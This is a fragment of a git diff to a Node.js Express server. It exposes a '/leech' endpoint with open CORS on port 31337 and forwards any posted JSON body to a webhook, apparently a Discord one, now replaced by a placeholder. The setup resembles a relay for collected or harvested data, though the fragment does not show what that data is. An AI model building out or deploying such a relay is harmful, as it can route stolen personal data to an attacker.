@@ -5,13 +5,15 @@ const request = require('request');
 const app = express();
 const port = 31337;
 
+const weebhookAPI = 'FILL_IN_HERE_DONT_COMMIT';
+
 app.use('*', cors({}));
 app.use(bodyParser.json());
 
 app.post('/leech', (req, res) => {
   const information = req.body;
   request.post(
-    discordWebhookAPI, 
+    weebhookAPI, 
     {
       body: JSON.stringify(information),
       headers: {
